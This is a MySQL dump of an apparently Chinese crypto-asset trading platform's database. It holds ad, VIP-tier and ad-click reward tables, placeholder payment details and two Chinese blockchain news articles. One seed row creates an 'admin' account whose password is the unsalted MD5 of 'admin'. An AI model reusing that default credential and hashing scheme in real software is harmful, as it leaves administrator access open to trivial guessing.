/*
Navicat MySQL Data Transfer

Source Server         : localhost_3306
Source Server Version : 50553
Source Host           : localhost:3306
Source Database       : a52

Target Server Type    : MYSQL
Target Server Version : 50553
File Encoding         : 65001

Date: 2018-04-02 11:26:19
*/

SET FOREIGN_KEY_CHECKS=0;

-- ----------------------------
-- Table structure for movesay_admin
-- ----------------------------
DROP TABLE IF EXISTS `movesay_admin`;
CREATE TABLE `movesay_admin` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `email` varchar(200) NOT NULL,
  `username` char(16) NOT NULL,
  `nickname` varchar(50) NOT NULL,
  `moble` varchar(50) NOT NULL,
  `password` char(32) NOT NULL,
  `sort` int(11) unsigned NOT NULL,
  `addtime` int(11) unsigned NOT NULL,
  `last_login_time` int(11) unsigned NOT NULL,
  `last_login_ip` int(11) unsigned NOT NULL,
  `endtime` int(11) unsigned NOT NULL,
  `status` int(4) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `status` (`status`),
  KEY `username` (`username`)
) ENGINE=MyISAM AUTO_INCREMENT=9 DEFAULT CHARSET=utf8 ROW_FORMAT=DYNAMIC COMMENT='管理员表';

-- ----------------------------
-- Records of movesay_admin
-- ----------------------------
INSERT INTO `movesay_admin` VALUES ('1', '', 'admin', '', '', '21232f297a57a5a743894a0e4a801fc3', '0', '0', '0', '0', '0', '1');

-- ----------------------------
-- Table structure for movesay_adver
-- ----------------------------
DROP TABLE IF EXISTS `movesay_adver`;
CREATE TABLE `movesay_adver` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(20) NOT NULL,
  `url` varchar(255) NOT NULL,
  `img` varchar(250) NOT NULL,
  `type` varchar(50) NOT NULL,
  `sort` int(11) unsigned NOT NULL,
  `addtime` int(11) unsigned NOT NULL,
  `endtime` int(11) unsigned NOT NULL,
  `status` tinyint(4) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `name` (`name`),
  KEY `status` (`status`)
) ENGINE=MyISAM AUTO_INCREMENT=14 DEFAULT CHARSET=utf8 ROW_FORMAT=DYNAMIC COMMENT='广告图片表';

-- ----------------------------
-- Records of movesay_adver
-- ----------------------------
INSERT INTO `movesay_adver` VALUES ('11', '3', '', '5887920f23e85.jpg', '', '0', '1485279756', '1485279758', '1');
INSERT INTO `movesay_adver` VALUES ('12', '8', '', '5895385442e24.jpg', '', '0', '1486174299', '1486174302', '1');
INSERT INTO `movesay_adver` VALUES ('10', '2', '', '5922c0d9d25b9.jpg', '', '0', '1483372800', '1483372800', '1');
INSERT INTO `movesay_adver` VALUES ('9', '1', '', '5922c0b9bf48c.jpg', '', '0', '1485279587', '1485279589', '1');
INSERT INTO `movesay_adver` VALUES ('8', '春节公告', '', '58878fbc59bd1.jpg', '', '1', '1475170380', '1475170382', '0');

-- ----------------------------
-- Table structure for movesay_appads
-- ----------------------------
DROP TABLE IF EXISTS `movesay_appads`;
CREATE TABLE `movesay_appads` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(20) NOT NULL,
  `content` varchar(256) NOT NULL,
  `url` varchar(255) NOT NULL,
  `img` varchar(255) DEFAULT NULL,
  `block_id` varchar(50) NOT NULL,
  `sort` int(11) unsigned NOT NULL,
  `addtime` int(11) unsigned NOT NULL,
  `endtime` int(11) unsigned NOT NULL,
  `status` tinyint(4) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `name` (`name`),
  KEY `status` (`status`)
) ENGINE=MyISAM AUTO_INCREMENT=31 DEFAULT CHARSET=utf8 ROW_FORMAT=DYNAMIC COMMENT='广告图片表';

-- ----------------------------
-- Records of movesay_appads
-- ----------------------------
INSERT INTO `movesay_appads` VALUES ('21', '购物广告1', '购物广告1内容', '/', '/Upload/app/1918451.jpg', '17', '0', '0', '0', '1');

-- ----------------------------
-- Table structure for movesay_appadsblock
-- ----------------------------
DROP TABLE IF EXISTS `movesay_appadsblock`;
CREATE TABLE `movesay_appadsblock` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(20) NOT NULL,
  `content` varchar(256) NOT NULL,
  `rank` varchar(256) DEFAULT NULL,
  `img` varchar(255) DEFAULT NULL,
  `remain` varchar(255) DEFAULT '3',
  `type` varchar(50) NOT NULL,
  `sort` int(11) unsigned NOT NULL,
  `addtime` int(11) unsigned NOT NULL,
  `endtime` int(11) unsigned NOT NULL,
  `status` tinyint(4) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `name` (`name`),
  KEY `status` (`status`)
) ENGINE=MyISAM AUTO_INCREMENT=20 DEFAULT CHARSET=utf8 ROW_FORMAT=DYNAMIC COMMENT='广告图片表';

-- ----------------------------
-- Records of movesay_appadsblock
-- ----------------------------
INSERT INTO `movesay_appadsblock` VALUES ('17', '购物广告', '购物板块介绍购物板块介绍购物板块介绍购物板块介绍', '4', '/Upload/app/577a0f30b2235.png', '6', '', '0', '0', '0', '1');
INSERT INTO `movesay_appadsblock` VALUES ('18', '挖财广告', '	挖财广告板块介绍挖财广告板块介绍挖财广告板块介绍', '2', '/Upload/app/577a0f537b103.png', '5', '', '0', '0', '0', '1');
INSERT INTO `movesay_appadsblock` VALUES ('19', '商城广告', '	商城广告描叙	商城广告描叙	商城广告描叙', '3', '/Upload/app/577a0fa0c9e1e.png', '4', '', '0', '0', '0', '1');

-- ----------------------------
-- Table structure for movesay_appc
-- ----------------------------
DROP TABLE IF EXISTS `movesay_appc`;
CREATE TABLE `movesay_appc` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `web_name` varchar(64) DEFAULT NULL,
  `web_title` varchar(64) DEFAULT NULL,
  `web_icp` varchar(64) DEFAULT NULL,
  `index_img` varchar(256) DEFAULT NULL,
  `pay` varchar(256) DEFAULT NULL,
  `withdraw_notice` varchar(256) DEFAULT NULL,
  `charge_notice` varchar(256) DEFAULT NULL,
  `show_coin` varchar(255) DEFAULT NULL,
  `show_market` varchar(255) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=3 DEFAULT CHARSET=utf8 ROW_FORMAT=DYNAMIC;

-- ----------------------------
-- Records of movesay_appc
-- ----------------------------
INSERT INTO `movesay_appc` VALUES ('2', 'OFA烯量资产', 'OFA烯量资产交易平台测试版', '#888999', '#', '{\"alipay\":{\"name\":\"\\u5f20\\u4e09\",\"value\":\"zhangsan@n7z.net\"},\"bank\":{\"name\":\"\\u674e\\u56db\",\"value\":\"88888888666666\"}}', '提现说明文字后台可配置', '充值说明文字 后台可配置', '[\"2\"]', '[\"1\"]');

-- ----------------------------
-- Table structure for movesay_app_log
-- ----------------------------
DROP TABLE IF EXISTS `movesay_app_log`;
CREATE TABLE `movesay_app_log` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `uid` int(11) NOT NULL,
  `type` varchar(64) NOT NULL,
  `content` varchar(255) NOT NULL,
  `addtime` int(10) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=50 DEFAULT CHARSET=utf8 ROW_FORMAT=DYNAMIC;

-- ----------------------------
-- Records of movesay_app_log
-- ----------------------------
INSERT INTO `movesay_app_log` VALUES ('31', '86345', 'vip', '初始化等级vip0', '1467622365');
INSERT INTO `movesay_app_log` VALUES ('32', '86345', 'vip', '升级到vip1', '1467622365');
INSERT INTO `movesay_app_log` VALUES ('33', '86345', 'click_ads', '查看广告[id:27]盈利:cny 0.2', '1467622984');
INSERT INTO `movesay_app_log` VALUES ('34', '86345', 'click_ads', '查看广告[id:27]盈利:cny 0.2', '1467623001');
INSERT INTO `movesay_app_log` VALUES ('35', '86345', 'click_ads', '查看广告[id:28]盈利:cny 0.2', '1467623021');
INSERT INTO `movesay_app_log` VALUES ('36', '86345', 'click_ads', '查看广告[id:22]盈利:cny 0.2', '1467626313');
INSERT INTO `movesay_app_log` VALUES ('37', '86345', 'click_ads', '查看广告[id:22]盈利:cny 0.2', '1467626334');
INSERT INTO `movesay_app_log` VALUES ('38', '86345', 'click_ads', '查看广告[id:27]盈利:cny 0.2', '1467639853');
INSERT INTO `movesay_app_log` VALUES ('39', '86345', 'click_ads', '查看广告[id:21]盈利:cny 0.2', '1467644164');
INSERT INTO `movesay_app_log` VALUES ('40', '86345', 'click_ads', '查看广告[id:21]盈利:cny 0.2', '1467644379');
INSERT INTO `movesay_app_log` VALUES ('41', '86345', 'click_ads', '查看广告[id:21]盈利:cny 0.2', '1467644822');
INSERT INTO `movesay_app_log` VALUES ('42', '86345', 'click_ads', '查看广告[id:22]盈利:cny 0.2', '1467644841');
INSERT INTO `movesay_app_log` VALUES ('43', '86345', 'vip', '升级到vip3', '1467773095');
INSERT INTO `movesay_app_log` VALUES ('44', '86345', 'click_ads', '查看广告[id:21]盈利:cny 0.3', '1467897644');
INSERT INTO `movesay_app_log` VALUES ('45', '86345', 'click_ads', '查看广告[id:27]盈利:cny 0.3', '1467904221');
INSERT INTO `movesay_app_log` VALUES ('46', '86345', 'click_ads', '查看广告[id:23]盈利:cny 0.3', '1468298986');
INSERT INTO `movesay_app_log` VALUES ('47', '86345', 'click_ads', '查看广告[id:26]盈利:cny 0.3', '1468477314');
INSERT INTO `movesay_app_log` VALUES ('48', '86345', 'click_ads', '查看广告[id:21]盈利:cny 0.3', '1468806973');
INSERT INTO `movesay_app_log` VALUES ('49', '86345', 'click_ads', '查看广告[id:21]盈利:cny 0.3', '1469116345');

-- ----------------------------
-- Table structure for movesay_app_vip
-- ----------------------------
DROP TABLE IF EXISTS `movesay_app_vip`;
CREATE TABLE `movesay_app_vip` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `tag` varchar(255) DEFAULT NULL,
  `name` varchar(32) DEFAULT NULL,
  `rule` text,
  `times` int(11) DEFAULT NULL,
  `price_num` varchar(255) DEFAULT NULL,
  `price_coin` varchar(255) DEFAULT NULL,
  `status` tinyint(4) DEFAULT NULL,
  `addtime` int(10) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=7 DEFAULT CHARSET=utf8 ROW_FORMAT=DYNAMIC;

-- ----------------------------
-- Records of movesay_app_vip
-- ----------------------------
INSERT INTO `movesay_app_vip` VALUES ('4', '1', 'vip1', '[{\"id\":\"1\",\"num\":10},{\"id\":\"2\",\"num\":20}]', '6', '0.1', '1', '1', '1467616831');
INSERT INTO `movesay_app_vip` VALUES ('5', '2', 'vip2', '[{\"id\":\"1\",\"num\":20},{\"id\":\"2\",\"num\":30}]', '6', '0.2', '1', '1', '1467616860');
INSERT INTO `movesay_app_vip` VALUES ('6', '3', 'vip3', '[{\"id\":\"1\",\"num\":30},{\"id\":\"2\",\"num\":40}]', '6', '0.3', '1', '1', '1467616884');

-- ----------------------------
-- Table structure for movesay_app_vipuser
-- ----------------------------
DROP TABLE IF EXISTS `movesay_app_vipuser`;
CREATE TABLE `movesay_app_vipuser` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `uid` int(11) NOT NULL,
  `vip_id` int(11) NOT NULL,
  `addtime` int(10) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=3 DEFAULT CHARSET=utf8 ROW_FORMAT=DYNAMIC;

-- ----------------------------
-- Records of movesay_app_vipuser
-- ----------------------------
INSERT INTO `movesay_app_vipuser` VALUES ('2', '86345', '6', '1467622365');

-- ----------------------------
-- Table structure for movesay_article
-- ----------------------------
DROP TABLE IF EXISTS `movesay_article`;
CREATE TABLE `movesay_article` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `title` varchar(255) CHARACTER SET utf8 NOT NULL,
  `en_title` varchar(255) CHARACTER SET utf8 DEFAULT NULL,
  `content` text CHARACTER SET utf8 NOT NULL,
  `en_content` text CHARACTER SET utf8,
  `adminid` int(10) unsigned NOT NULL,
  `type` varchar(255) CHARACTER SET utf8 NOT NULL,
  `hits` int(11) unsigned NOT NULL,
  `footer` int(11) unsigned NOT NULL,
  `index` int(11) unsigned NOT NULL,
  `sort` int(11) unsigned NOT NULL,
  `addtime` int(11) unsigned NOT NULL,
  `endtime` int(11) unsigned NOT NULL,
  `status` tinyint(4) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `status` (`status`),
  KEY `type` (`type`),
  KEY `adminid` (`adminid`)
) ENGINE=MyISAM AUTO_INCREMENT=79 DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

-- ----------------------------
-- Records of movesay_article
-- ----------------------------
INSERT INTO `movesay_article` VALUES ('9', '区块链初创企业Loyyal加入迪拜未来加速器项目', null, '<p style=\"text-indent:2em;color:#333333;font-family:\'Microsoft Yahei\', Arial, Helvetica, \'Hiragino Sans GB\', \'WenQuanYi Micro Hei\', sans-serif;font-size:14px;font-style:normal;font-weight:normal;text-align:start;background-color:#FFFFFF;\">\r\n	<img src=\"https://news.huobi.com/public/picture/edit/1610/49021_101511_9300.png\" alt=\"\" style=\"height:auto;border:0px;\" />\r\n</p>\r\n<p style=\"text-indent:2em;color:#333333;font-family:\'Microsoft Yahei\', Arial, Helvetica, \'Hiragino Sans GB\', \'WenQuanYi Micro Hei\', sans-serif;font-size:14px;font-style:normal;font-weight:normal;text-align:start;background-color:#FFFFFF;\">\r\n	<br />\r\n</p>\r\n<p style=\"text-indent:2em;color:#333333;font-family:\'Microsoft Yahei\', Arial, Helvetica, \'Hiragino Sans GB\', \'WenQuanYi Micro Hei\', sans-serif;font-size:14px;font-style:normal;font-weight:normal;text-align:start;background-color:#FFFFFF;\">\r\n	Loyyal对于很多区块链爱好者来说可能不太熟悉。该公司是一家使用区块链和智能合约技术而创建的全球通用忠诚度奖励平台。在本周该公司宣布他们将加入迪拜未来加速器项目。毫无疑问，对于该区块链初创企业来说又向前迈了很大一步。\r\n</p>\r\n<p style=\"text-indent:2em;color:#333333;font-family:\'Microsoft Yahei\', Arial, Helvetica, \'Hiragino Sans GB\', \'WenQuanYi Micro Hei\', sans-serif;font-size:14px;font-style:normal;font-weight:normal;text-align:start;background-color:#FFFFFF;\">\r\n	有趣的是迪拜未来加速器项目的形成。该加速器是由迪拜殿下酋长Mohammed bin Rashid Al Maktoum和其他几个社会高层人士发起的。该加速器获得了2.75亿美金的支持，迪拜也希望能在创新科技的竞赛中获得领导性的地位。对于Loyyal来说，又向前迈进了很大一步该加速器的基本目标是发现新型科技。区块链能够解决全世界的一些问题，而且能提供一个更好的生态系统。迪拜加速器的所有参与者将会获得支持来开发原型产品。如果这些开发成果不错的话，迪拜也计划在全国部署这些服务。\r\n</p>\r\n<p style=\"text-indent:2em;color:#333333;font-family:\'Microsoft Yahei\', Arial, Helvetica, \'Hiragino Sans GB\', \'WenQuanYi Micro Hei\', sans-serif;font-size:14px;font-style:normal;font-weight:normal;text-align:start;background-color:#FFFFFF;\">\r\n	对于Loyyal来说，加入迪拜未来加速器项目也是很有意义的。该区块链初创企业将与迪拜控股一起工作，后者致力于酒店和房地产以及其它业务。减少纸质工作以及减少中间商是他们的首要目标。这也非常符合Loyyal和他们的区块链开发理念。\r\n</p>\r\n<p style=\"text-indent:2em;color:#333333;font-family:\'Microsoft Yahei\', Arial, Helvetica, \'Hiragino Sans GB\', \'WenQuanYi Micro Hei\', sans-serif;font-size:14px;font-style:normal;font-weight:normal;text-align:start;background-color:#FFFFFF;\">\r\n	Loyyal的CEO和联合创始人Greg Simon告诉媒体：“Loyyal很高兴和荣幸作为少数科技公司之一被这个历史性的机遇所选中。该加速器选择了全球最前沿的31家科技企业，将它们聚集起来为具体的政府问题开发解决方案，并迅速地向全社会部署这些解决方案。人们会对这个貌似遥远的未来科技迅速的成为现实而感到惊奇，感谢迪拜和未来加速器基金会的支持。”加入该加速器也并不完全意外。Loyyal是迪拜全球区块链委员会的成员之一，他们一起协作来旅游行业开发全国区块链解决方案。该公司使用他们自己的原生区块链来提供服务，目的是为了激励志愿工作者。值得关注的是，看看这个公司未来会有什么开发计划。\r\n</p>\r\n<p style=\"text-indent:2em;color:#333333;font-family:\'Microsoft Yahei\', Arial, Helvetica, \'Hiragino Sans GB\', \'WenQuanYi Micro Hei\', sans-serif;font-size:14px;font-style:normal;font-weight:normal;text-align:start;background-color:#FFFFFF;\">\r\n	【来源】\r\n</p>\r\n<span style=\"color:#333333;font-family:\'Microsoft Yahei\', Arial, Helvetica, \'Hiragino Sans GB\', \'WenQuanYi Micro Hei\', sans-serif;font-size:14px;font-style:normal;font-weight:normal;line-height:20px;background-color:#FFFFFF;\">http://news.blockchain.hk/blockchain-startup-loyyal-partakes-dubai-future-accelerators-program/</span><br />\r\n<p style=\"text-indent:2em;font-family:\'Microsoft Yahei\', Arial, Helvetica, \'Hiragino Sans GB\', \'WenQuanYi Micro Hei\', sans-serif;font-size:14px;font-style:normal;font-weight:normal;text-align:start;color:gray;background-color:#FFFFFF;\">\r\n	（此文仅代表作者本人观点，不代表OFC立场）\r\n</p>', null, '1', 'bbb', '0', '1', '1', '0', '1447197238', '1476156926', '1');
INSERT INTO `movesay_article` VALUES ('10', '2017年区块链企业发展将何去何从？', null, '<p style=\"text-indent:2em;color:#333333;font-family:\'Microsoft Yahei\', Arial, Helvetica, \'Hiragino Sans GB\', \'WenQuanYi Micro Hei\', sans-serif;font-size:14px;font-style:normal;font-weight:normal;text-align:start;background-color:#FFFFFF;\">\r\n	块链能掀起一场改革。区块链拥有巨大的潜力，足以颠覆整个经济架构，使其与互联网时代的步伐保持一致。这场改革之所以迟迟没有发生是因为我们还停留在对区块链的概念和应用的讨论阶段。\r\n</p>\r\n<p style=\"text-indent:2em;color:#333333;font-family:\'Microsoft Yahei\', Arial, Helvetica, \'Hiragino Sans GB\', \'WenQuanYi Micro Hei\', sans-serif;font-size:14px;font-style:normal;font-weight:normal;text-align:start;background-color:#FFFFFF;\">\r\n	在过去的1年里，我参加过多场会议和活动。我发现大家关注的焦点还是代币、货币和矿工等。我只想说这类话题太不着边际。区块链不是一个孤立的系统，它的影响深远。而目前我们才刚刚开始讨论区块链架构如何部署在银行业以外的商业领域，以及区块链如何带领事物往更好的方向发展。\r\n</p>\r\n<p style=\"text-indent:2em;color:#333333;font-family:\'Microsoft Yahei\', Arial, Helvetica, \'Hiragino Sans GB\', \'WenQuanYi Micro Hei\', sans-serif;font-size:14px;font-style:normal;font-weight:normal;text-align:start;background-color:#FFFFFF;\">\r\n	为了更好地了解2017年区块链的基础架构，我们必须分几个角度探讨这一问题。\r\n</p>\r\n<p style=\"text-indent:2em;color:#333333;font-family:\'Microsoft Yahei\', Arial, Helvetica, \'Hiragino Sans GB\', \'WenQuanYi Micro Hei\', sans-serif;font-size:14px;font-style:normal;font-weight:normal;text-align:start;background-color:#FFFFFF;\">\r\n	<img alt=\"区块链公司\" src=\"https://news.huobi.com/public/picture/edit/1610/213858_101610_9093_0.jpg\" style=\"height:auto;border:0px;\" />\r\n</p>\r\n<p style=\"text-indent:2em;color:#333333;font-family:\'Microsoft Yahei\', Arial, Helvetica, \'Hiragino Sans GB\', \'WenQuanYi Micro Hei\', sans-serif;font-size:14px;font-style:normal;font-weight:normal;text-align:start;background-color:#FFFFFF;\">\r\n	&nbsp;\r\n</p>\r\n<h2 style=\"font-family:\'Microsoft Yahei\', Arial, Helvetica, \'Hiragino Sans GB\', \'WenQuanYi Micro Hei\', sans-serif;font-weight:700;color:#333333;font-size:1.5em;font-style:normal;text-align:start;text-indent:0px;background-color:#FFFFFF;\">\r\n	银行业\r\n</h2>\r\n<p style=\"text-indent:2em;color:#333333;font-family:\'Microsoft Yahei\', Arial, Helvetica, \'Hiragino Sans GB\', \'WenQuanYi Micro Hei\', sans-serif;font-size:14px;font-style:normal;font-weight:normal;text-align:start;background-color:#FFFFFF;\">\r\n	&nbsp;\r\n</p>\r\n<p style=\"text-indent:2em;color:#333333;font-family:\'Microsoft Yahei\', Arial, Helvetica, \'Hiragino Sans GB\', \'WenQuanYi Micro Hei\', sans-serif;font-size:14px;font-style:normal;font-weight:normal;text-align:start;background-color:#FFFFFF;\">\r\n	全球各个银行都开始建立沙箱，测试区块链技术如何部署到他们的核心业务中去。如果你认为银行业慢人一步，远远落在了区块链创新研究的最后面，你就错了。实际上，银行最早开始测试区块链技术，但具体应用的落地还需要不少时间。\r\n</p>\r\n<p style=\"text-indent:2em;color:#333333;font-family:\'Microsoft Yahei\', Arial, Helvetica, \'Hiragino Sans GB\', \'WenQuanYi Micro Hei\', sans-serif;font-size:14px;font-style:normal;font-weight:normal;text-align:start;background-color:#FFFFFF;\">\r\n	虽然沙箱机制能确保内部团队专心进行研究，但为了能更好地测试和研究该技术，仍需要移除多项障碍。\r\n</p>\r\n<p style=\"text-indent:2em;color:#333333;font-family:\'Microsoft Yahei\', Arial, Helvetica, \'Hiragino Sans GB\', \'WenQuanYi Micro Hei\', sans-serif;font-size:14px;font-style:normal;font-weight:normal;text-align:start;background-color:#FFFFFF;\">\r\n	大多数区块链爱好者和企业都愿意甚至渴望和银行合作。但我认为，最终，银行会组建自己的内部专家小组，因为这才是他们在市场中保持竞争力的最佳选择。\r\n</p>\r\n<p style=\"text-indent:2em;color:#333333;font-family:\'Microsoft Yahei\', Arial, Helvetica, \'Hiragino Sans GB\', \'WenQuanYi Micro Hei\', sans-serif;font-size:14px;font-style:normal;font-weight:normal;text-align:start;background-color:#FFFFFF;\">\r\n	&nbsp;\r\n</p>\r\n<h2 style=\"font-family:\'Microsoft Yahei\', Arial, Helvetica, \'Hiragino Sans GB\', \'WenQuanYi Micro Hei\', sans-serif;font-weight:700;color:#333333;font-size:1.5em;font-style:normal;text-align:start;text-indent:0px;background-color:#FFFFFF;\">\r\n	商业\r\n</h2>\r\n<p style=\"text-indent:2em;color:#333333;font-family:\'Microsoft Yahei\', Arial, Helvetica, \'Hiragino Sans GB\', \'WenQuanYi Micro Hei\', sans-serif;font-size:14px;font-style:normal;font-weight:normal;text-align:start;background-color:#FFFFFF;\">\r\n	&nbsp;\r\n</p>\r\n<p style=\"text-indent:2em;color:#333333;font-family:\'Microsoft Yahei\', Arial, Helvetica, \'Hiragino Sans GB\', \'WenQuanYi Micro Hei\', sans-serif;font-size:14px;font-style:normal;font-weight:normal;text-align:start;background-color:#FFFFFF;\">\r\n	都说金融和银行领域会在区块链技术中获利。但其实，商业领域才充满了机遇。因为相对金融行业来说，商业领域的监管更少，更容易采用新技术。\r\n</p>\r\n<p style=\"text-indent:2em;color:#333333;font-family:\'Microsoft Yahei\', Arial, Helvetica, \'Hiragino Sans GB\', \'WenQuanYi Micro Hei\', sans-serif;font-size:14px;font-style:normal;font-weight:normal;text-align:start;background-color:#FFFFFF;\">\r\n	问问你自己：用户真的在意你有没有用区块链来记录他们的信息吗？通常这个问题的答案是否定的。他们只希望你的应用不至于被随意更改。这才是真正的商业解决方案。\r\n</p>\r\n<p style=\"text-indent:2em;color:#333333;font-family:\'Microsoft Yahei\', Arial, Helvetica, \'Hiragino Sans GB\', \'WenQuanYi Micro Hei\', sans-serif;font-size:14px;font-style:normal;font-weight:normal;text-align:start;background-color:#FFFFFF;\">\r\n	要想区块链框架真正产生全球影响力，那些为企业提供软件服务的应用商必须采用这一技术。\r\n</p>\r\n<p style=\"text-indent:2em;color:#333333;font-family:\'Microsoft Yahei\', Arial, Helvetica, \'Hiragino Sans GB\', \'WenQuanYi Micro Hei\', sans-serif;font-size:14px;font-style:normal;font-weight:normal;text-align:start;background-color:#FFFFFF;\">\r\n	很多公司都试图建立基于区块链的商业应用，但他们缺乏经验，这几乎成了一种市场趋势——运行区块链实在太困难了。很多区块链公司都在融资，认为自己的解决方案或工具比前端表现更佳，因为用户可以直接在区块链上看到产品，并且从中获利。但问题是，这些区块链公司真的了解具体的业务运作和整个产品部署流程吗？\r\n</p>\r\n<p style=\"text-indent:2em;color:#333333;font-family:\'Microsoft Yahei\', Arial, Helvetica, \'Hiragino Sans GB\', \'WenQuanYi Micro Hei\', sans-serif;font-size:14px;font-style:normal;font-weight:normal;text-align:start;background-color:#FFFFFF;\">\r\n	再举一个具体的例子：北美地区开发的软件如何在全球其它地方（比如说亚洲）进行部署呢？\r\n</p>\r\n<p style=\"text-indent:2em;color:#333333;font-family:\'Microsoft Yahei\', Arial, Helvetica, \'Hiragino Sans GB\', \'WenQuanYi Micro Hei\', sans-serif;font-size:14px;font-style:normal;font-weight:normal;text-align:start;background-color:#FFFFFF;\">\r\n	&nbsp;\r\n</p>\r\n<h2 style=\"font-family:\'Microsoft Yahei\', Arial, Helvetica, \'Hiragino Sans GB\', \'WenQuanYi Micro Hei\', sans-serif;font-weight:700;color:#333333;font-size:1.5em;font-style:normal;text-align:start;text-indent:0px;background-color:#FFFFFF;\">\r\n	改变公共资本市场\r\n</h2>\r\n<p style=\"text-indent:2em;color:#333333;font-family:\'Microsoft Yahei\', Arial, Helvetica, \'Hiragino Sans GB\', \'WenQuanYi Micro Hei\', sans-serif;font-size:14px;font-style:normal;font-weight:normal;text-align:start;background-color:#FFFFFF;\">\r\n	&nbsp;\r\n</p>\r\n<p style=\"text-indent:2em;color:#333333;font-family:\'Microsoft Yahei\', Arial, Helvetica, \'Hiragino Sans GB\', \'WenQuanYi Micro Hei\', sans-serif;font-size:14px;font-style:normal;font-weight:normal;text-align:start;background-color:#FFFFFF;\">\r\n	举个简单的例子：微信是一体化的社交媒体平台，在亚洲非常受欢迎。推特、脸书、Google+、Instagram、Skype、谷歌钱包和Apple Pay该有的功能它都有。\r\n</p>\r\n<p style=\"text-indent:2em;color:#333333;font-family:\'Microsoft Yahei\', Arial, Helvetica, \'Hiragino Sans GB\', \'WenQuanYi Micro Hei\', sans-serif;font-size:14px;font-style:normal;font-weight:normal;text-align:start;background-color:#FFFFFF;\">\r\n	同样的，区块链系统正常运作的前提是开发者对整个生态系统的充分了解。就像布莱斯•马斯特斯（Blythe Masters）和她的数字资产集团（Digital Asset Holdings）一样。他们就在改变公共资本市场，不仅限于市场的一部分，而是涉及了整个资本市场机器的每一颗齿轮。为了实现这个目标，确保产品的顺利部署，该集团必须招揽各个领域的专家。他们与纳斯达克（Nasdaq）和澳交所（ASX）的合作就是最好的证明。其他的区块链供应商都没能达到这种境界。\r\n</p>\r\n<p style=\"text-indent:2em;color:#333333;font-family:\'Microsoft Yahei\', Arial, Helvetica, \'Hiragino Sans GB\', \'WenQuanYi Micro Hei\', sans-serif;font-size:14px;font-style:normal;font-weight:normal;text-align:start;background-color:#FFFFFF;\">\r\n	2017年，任何企图涉足商业应用领域的区块链公司，如果仍然停留在概念阶段，一定无法生存。我们会见到越来越多类似数字资产集团的企业。2017年，区块链带来的深远影响将涉及保险、房地产、挖矿、石油、私有公司，甚至是政府。政府会紧跟银行的脚步，同样建立沙箱。各个区块链公司也会和各自领域的巨头建立合作。\r\n</p>\r\n<p style=\"text-indent:2em;color:#333333;font-family:\'Microsoft Yahei\', Arial, Helvetica, \'Hiragino Sans GB\', \'WenQuanYi Micro Hei\', sans-serif;font-size:14px;font-style:normal;font-weight:normal;text-align:start;background-color:#FFFFFF;\">\r\n	&nbsp;\r\n</p>\r\n<h2 style=\"font-family:\'Microsoft Yahei\', Arial, Helvetica, \'Hiragino Sans GB\', \'WenQuanYi Micro Hei\', sans-serif;font-weight:700;color:#333333;font-size:1.5em;font-style:normal;text-align:start;text-indent:0px;background-color:#FFFFFF;\">\r\n	发展壮大\r\n</h2>\r\n<p style=\"text-indent:2em;color:#333333;font-family:\'Microsoft Yahei\', Arial, Helvetica, \'Hiragino Sans GB\', \'WenQuanYi Micro Hei\', sans-serif;font-size:14px;font-style:normal;font-weight:normal;text-align:start;background-color:#FFFFFF;\">\r\n	&nbsp;\r\n</p>\r\n<p style=\"text-indent:2em;color:#333333;font-family:\'Microsoft Yahei\', Arial, Helvetica, \'Hiragino Sans GB\', \'WenQuanYi Micro Hei\', sans-serif;font-size:14px;font-style:normal;font-weight:normal;text-align:start;background-color:#FFFFFF;\">\r\n	总而言之，区块链的发展队伍正在逐渐壮大。投资者早就意识到了这一点。区块链公司出品的手机app能够进行P2P转账，交易速度甚至会超越传统企业；区块链公司将获得大量融资，开拓更多的应用服务……\r\n</p>\r\n<p style=\"text-indent:2em;color:#333333;font-family:\'Microsoft Yahei\', Arial, Helvetica, \'Hiragino Sans GB\', \'WenQuanYi Micro Hei\', sans-serif;font-size:14px;font-style:normal;font-weight:normal;text-align:start;background-color:#FFFFFF;\">\r\n	不过，很多区块链公司的研究都只是皮毛，他们没有实践知识，并不了解产品及业务运作。\r\n</p>\r\n<p style=\"text-indent:2em;color:#333333;font-family:\'Microsoft Yahei\', Arial, Helvetica, \'Hiragino Sans GB\', \'WenQuanYi Micro Hei\', sans-serif;font-size:14px;font-style:normal;font-weight:normal;text-align:start;background-color:#FFFFFF;\">\r\n	因此真正的投资者应该关注那些拥有丰富知识、专业人才，以及了解商业流程的企业。当然了，前提是他们能够接纳区块链技术。\r\n</p>\r\n<p style=\"text-indent:2em;font-family:\'Microsoft Yahei\', Arial, Helvetica, \'Hiragino Sans GB\', \'WenQuanYi Micro Hei\', sans-serif;font-size:14px;font-style:normal;font-weight:normal;text-align:start;color:gray;background-color:#FFFFFF;\">\r\n	（此文仅代表作者本人观点，不代表OFC立场）\r\n</p>', null, '1', 'bbb', '0', '1', '1', '0', '1447197283', '1476156879', '1');
